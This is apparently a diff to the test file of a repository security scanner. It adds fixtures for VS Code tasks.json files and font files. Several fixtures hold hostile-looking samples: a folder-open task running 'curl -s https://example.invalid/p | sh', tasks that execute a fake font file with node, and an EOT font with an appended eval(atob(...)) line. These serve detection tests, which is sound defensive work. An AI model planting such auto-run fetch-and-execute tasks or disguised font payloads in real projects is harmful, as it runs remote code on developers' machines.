@@ -86,6 +86,14 @@ const ttf = () => {
   h.write('glyf', 12, 'latin1'); h.writeUInt32BE(28, 20); h.writeUInt32BE(200, 24);
   return Buffer.concat([h, noise(200, 11)]);
 };
+// EOT: little-endian sizes, version 2.2, "LP" magic at 34; `pad` = bytes the header over-counts (writer padding).
+const eot = (pad) => {
+  const body = noise(300, 5);
+  const h = Buffer.alloc(82);
+  h.writeUInt32LE(82 + body.length + pad, 0); h.writeUInt32LE(body.length, 4); h.writeUInt32LE(0x20002, 8);
+  h.write('LP', 34, 'latin1');
+  return Buffer.concat([h, body]);
+};
 const files = {
   llf: put('public/fonts/fa-solid-300.llf', tabbed),
   fakeWoff2: put('public/fonts/fa-solid-500.woff2', 'var inert = 0;\n'),
@@ -162,6 +170,14 @@ const files = {
     '  "windows": { "command": "curl -s https://example.invalid/p | sh" }, "runOptions": { "runOn": "folderOpen" } } ] },\n' +
     '  "windows": { "tasks": [ { "label": "b", "type": "shell", "command": "curl -s https://example.invalid/p | sh" } ] },\n' +
     '  "tasks": [ { "label": "b", "type": "shell", "command": "echo b" } ] }\n'),
+  osAllOverride: put('v9/.vscode/tasks.json', '{ "version": "2.0.0", "tasks": [ { "label": "dev", "type": "shell", "command": "curl -s https://example.invalid/p | sh",\n' +
+    '  "windows": { "command": "npm run dev" }, "osx": { "command": "npm run dev" }, "linux": { "command": "npm run dev" },\n' +
+    '  "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  fileArgsOwnCommand: put('v10/.vscode/tasks.json', '{ "version": "2.0.0", "args": ["public/fonts/x.llf"],\n' +
+    '  "tasks": [ { "label": "w", "type": "shell", "command": "node", "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  woff2NamedWoff: put('v11/fonts/vendor.woff', woff2(), null),
+  eotPadded: put('v11/fonts/padded.eot', eot(2), null),
+  eotAppended: put('v11/fonts/appended.eot', Buffer.concat([eot(0), Buffer.from("\n;eval(atob('x'));\n", 'latin1')]), null),
   workspaceNoTasks: put('v8/a.code-workspace', '{ "folders": [ { "path": "." } ], "launch": { "configurations": [ { "name": "x", "runOn": "FolderOpen" } ] } }\n'),
   osEvil: put('r10/.vscode/tasks.json', '{ "tasks": [ { "label": "dev", "type": "shell", "command": "npm run dev",\n' +
     '  "osx": { "command": "node", "args": ["public/fonts/x.llf"] }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
@@ -217,6 +233,11 @@ check('SEC2: file command + file args + task args are judged together',
   at(files.fileArgs).some((f) => f.severity === 'critical' && /on osx/.test(f.message)));
 check('SEC2: an osx-list task is judged on osx only, with osx dependencies', onlyWarnings(files.osListScope, 1));
 check('SEC2: parseable .code-workspace without tasks is not reported', at(files.workspaceNoTasks).length === 0);
+check('REVIEW3: a base command every platform overrides is not judged', onlyWarnings(files.osAllOverride, 1));
+check('REVIEW3: file args are not appended to a task\'s own command (VS Code fillGlobals)', onlyWarnings(files.fileArgsOwnCommand, 1));
+check('REVIEW3: WOFF2 data named .woff is a real font', at(files.woff2NamedWoff).length === 0);
+check('REVIEW3: EOT whose header over-counts by writer padding is a real font', at(files.eotPadded).length === 0);
+check('REVIEW3: EOT with data appended after it is a fake font', crit(files.eotAppended, 'fake-font'));
 {
   // dependsOn analysis stays fast at the limits: a dense graph, and every reference resolving to every task.
   const { scanArtifacts } = require('../src/artifacts');
